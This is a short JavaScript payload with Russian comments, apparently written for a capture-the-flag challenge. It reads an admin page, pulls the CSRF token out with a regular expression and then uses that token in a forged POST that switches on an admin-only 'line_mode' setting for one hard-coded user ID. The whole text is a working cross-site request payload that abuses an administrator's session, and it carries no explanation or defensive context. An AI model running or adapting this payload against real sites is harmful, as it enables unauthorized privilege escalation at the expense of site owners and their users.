(async () => {
    // 1. Получаем страницу админки, чтобы вытащить токен
    const resp = await fetch('/admin/pending');
    const html = await resp.text();
    const token = html.match(/name="csrf_token" value="([^"]+)"/)[1];

    // 2. Включаем себе line_mode
    const formData = new URLSearchParams();
    formData.append('line_mode', '1');
    formData.append('csrf_token', token);

    await fetch('/admin/line-mode/user/2b3549aa-5e6a-47ef-8f24-a82a5cfe29b3', {
        method: 'POST',
        body: formData
    });
    
    console.log("Flag should be active now!");
})();
